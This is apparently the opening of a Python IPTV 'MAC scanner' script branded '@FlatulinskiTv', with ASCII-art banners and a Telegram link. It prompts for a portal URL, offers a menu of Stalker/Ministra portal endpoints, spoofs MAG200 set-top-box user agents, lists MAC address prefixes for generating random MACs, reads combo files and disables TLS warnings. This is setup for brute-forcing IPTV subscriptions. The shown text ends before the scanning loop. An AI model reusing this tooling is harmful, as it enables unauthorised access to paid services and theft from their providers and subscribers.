
import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re

nickn=""
if nickn=="":
        nickn=""
try:
        import androidhelper as sl4a
        ad = sl4a.Android()
except:pass
import subprocess
try:
        import threading
except:pass
import pathlib

try:
        import requests
except:
        print("requests modul not found \n requests modul installing now... \n")
        pip.main(['install', 'requests'])
import requests
try:
        import sock
except:
        print("sock modul not found \n sock modul installing now \n")
        pip.main(['install', 'requests[socks]'] )
        pip.main(['install', 'sock'] )
        pip.main(['install', 'socks'] )
        pip.main(['install', 'PySocks'] )
import sock

try:
	from playsound import playsound#import requests
except:
	print("requests Modul ist nicht installiert \n requests Modul Wird geladen \n")
	pip.main(['install', 'playsound'])
maca=0
macv=0
  
nickn=""
nickn=""
white=("""\033[1;37;40m\n""") 
if nickn=="":
	nickn="@FlatulinskiTv"

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
import pathlib
#subprocess.run(["clear", ""])
try:
	import threading
except:pass
import pathlib

try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

try:
	from playsound import playsound#import requests
except:
	print("requests Modul ist nicht installiert \n requests Modul Wird geladen \n")
	pip.main(['install', 'playsound'])

#subprocess.run(["clear", ""])
getmac=""
oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
os.system('cls')
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

say1=0
say2=0
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
prox=0
cpm=0

def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)
a("""\033[1;92m                                                                                                          
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣶⣶⡾⠷⠷⣶⣶⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⢡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⢻⡀⠀⠀⠘⣿⣦⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⡏⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣄⠀⠀⠀⢳⡄⠀⠀⣿⡿⠿⠿⣿⣿⣿⣷⣦⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣏⣿⠀⠀⠀⠀⠀⣴⡇⠀⣼⡁⠀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠈⢻⣏⠻⠶⣤⣀⡀⠀⠀⠀⠘⢿⣷⡄⠀⠈⣿⠀⠀⣸⡇⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣷⣶⣄⡀
⠀⠀⢀⣠⣤⣶⣾⣿⡟⠀⠀⠀⢀⣾⣿⠁⣰⣿⣇⠀⠀⢸⣇⠙⠷⣤⣄⠀⠀⠀⠀⠙⢷⣤⡀⠉⠙⠛⠲⢶⣤⣌⣷⡟⣦⠀⢸⣇⠀⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻
⣾⡿⠿⠟⠛⠋⠁⢸⣧⠀⠀⠀⣼⠏⣿⣆⣿⠃⢿⣆⠀⠀⢿⣆⠀⠈⠙⠛⠷⠦⣤⣤⣄⣙⣻⣦⣤⣠⠀⠀⠀⠈⠉⠛⠛⢷⣼⣿⢰⡟⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢸⡿⠀⢻⣿⡿⠀⠈⢻⣦⣀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⡌⢻⣿⣿⠏⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⣾⡇⠀⠈⢿⡇⠀⠀⠀⠉⠻⣷⣌⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⣿⢹⡟⢱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡏⣿⡄⣿⡇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣿⣜⣴⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⡆⣿⠙⠛⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣸⣧⣤⣤⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠸⡆⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠛⠉⠙⠃⣿⡇⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠛⠛⠛⠛⠿⢿⣿⣷⣦⣄⡀⠀⠀⠀⢰⡇⠀⠀⢻⣄⠀⣀⣴⣾⣿⠿⠟⣩⠇⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠸⣦⣛⣛⣻⡿⠷⠶⠶⢿⡇⠀⠀⢸⡟⠿⠟⠛⠙⠓⠲⠾⣦⠀⠀⠀⠀⣠⣾⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠠⠞⠛⠁⠀⠀⠀⢀⣼⣧⠀⠀⠀⡿⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡁⠙⠀⠀⠰⢃⣸⡏⠉⠉⠛⢶⣄⡀⠀⠀⠀⢸⡁⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠻⡆⠀⠀⠀⠀⢀⣼⠏⠀⠘⠻⢷⣤⣤⣶⠟⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠈⡇⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢿⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠃⠀⠀⢸⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢸⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⣾⡏⠉⠙⠛⠒⠒⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⣿⣆⠀⠀⠀⠀⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠃⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠁⠀⠀⠙⢿⣷⣀⠀⠀⠹⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡴⠶⠛⠉⠉⠹⣷⠀⠀⠀⠀⠀⢀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⣿⣦⡀⠀⠁⠀⣾⡉⠀⢀⣠⣉⡉⣻⡿⣧⣤⡤⠞⣲⣶⠚⢻⡇⠀⠀⠀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⣠⠿⠭⠽⠗⠒⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⡉⠉⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠰⣄⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⠀⣀⣠⡼⠃⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀⠈⠓⠒⠒⠛⠉⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⠁⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠤⢤⣤⣤⣄⣀⡀⠈⠛⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⣴⣶⣶⣶⣾⠿⠛⠉⠀⠀⠀⣠⣴⡶⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠷⣦⣤⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⢦⣤⣀⡤⠴⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;93m                         Windows Edition           \33[0m⠀⠀⠀⠀⠀
\033[1;91m                      Visit us on Telegram          \33[0m
\033[1;91m                https://t.me/FlatulinskiIpTvHilfe       \33[0m""")
time.sleep(1)
macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""""")
print(feyzo) 
kisacikti=""
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
nick='@FlatulinskiTv'
bekleme=1
isimle="" 
intro="""\033[1;96mOfferer Url & Port=\033[1;92m"""
a="""panel-port = """
panel = input(intro)
print('\33[0m')
speed=""



uzmanm="portal.php"
useragent="okhttp/4.7.1"


if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	
    	print(feyzo) 
    	panel = input(intro)
    	
if  panel=="0":
    	uzmanm=input('Yazınız=')
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(intro)

if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="3":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="4":
    	uzmanm="bs.mag.portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)

if panel=="5":
    	uzmanm="portalcc.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="6":
    	uzmanm="magLoad.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="7":
    	uzmanm="ministra/portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="8":
    	uzmanm="cp/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="9":
    	uzmanm="korisnici/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="10":
    	uzmanm="tek/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="11":
    	uzmanm="emu/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="12":
    	uzmanm="emu2/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="13":
    	uzmanm="ghandi_portal/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="14":
    	uzmanm="c/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    	
if panel=="15":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo) 
    	panel = input(a)
    #if uzmanm=="0":
    	#isimle=input("Şekili nickinizi veya telegram nickinizi yazın\n  Nick=")
realblue=""
if panel=="20":
	realblue="real"
	#subprocess.run(["clear", ""])
	print(feyzo) 
	panel = input(intro)

print('\33[0m')	



	
#speed="xxl"	
#uzmanm="server/load.php"

print(panel)

#	print(panel)#http://z.zcatt.cc/stalker_porta/c/

print("\33[1;40m"+feyzo) 
kanalkata="0"

#subprocess.run(["clear", ""])
print(feyzo) 
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \033[1;92m           0 Random Macs  \33[0m\n"
 	dir='./combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	          \033[1;91m"+str(say)+" "+files+'  \n'
 	print ("""
\033[1;92m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣶⣶⡾⠷⠷⣶⣶⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⢡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⢻⡀⠀⠀⠘⣿⣦⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⡏⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣄⠀⠀⠀⢳⡄⠀⠀⣿⡿⠿⠿⣿⣿⣿⣷⣦⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣏⣿⠀⠀⠀⠀⠀⣴⡇⠀⣼⡁⠀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠈⢻⣏⠻⠶⣤⣀⡀⠀⠀⠀⠘⢿⣷⡄⠀⠈⣿⠀⠀⣸⡇⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣷⣶⣄⡀
⠀⠀⢀⣠⣤⣶⣾⣿⡟⠀⠀⠀⢀⣾⣿⠁⣰⣿⣇⠀⠀⢸⣇⠙⠷⣤⣄⠀⠀⠀⠀⠙⢷⣤⡀⠉⠙⠛⠲⢶⣤⣌⣷⡟⣦⠀⢸⣇⠀⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻
⣾⡿⠿⠟⠛⠋⠁⢸⣧⠀⠀⠀⣼⠏⣿⣆⣿⠃⢿⣆⠀⠀⢿⣆⠀⠈⠙⠛⠷⠦⣤⣤⣄⣙⣻⣦⣤⣠⠀⠀⠀⠈⠉⠛⠛⢷⣼⣿⢰⡟⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢸⡿⠀⢻⣿⡿⠀⠈⢻⣦⣀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⡌⢻⣿⣿⠏⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⣾⡇⠀⠈⢿⡇⠀⠀⠀⠉⠻⣷⣌⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⣿⢹⡟⢱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡏⣿⡄⣿⡇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣿⣜⣴⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⡆⣿⠙⠛⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
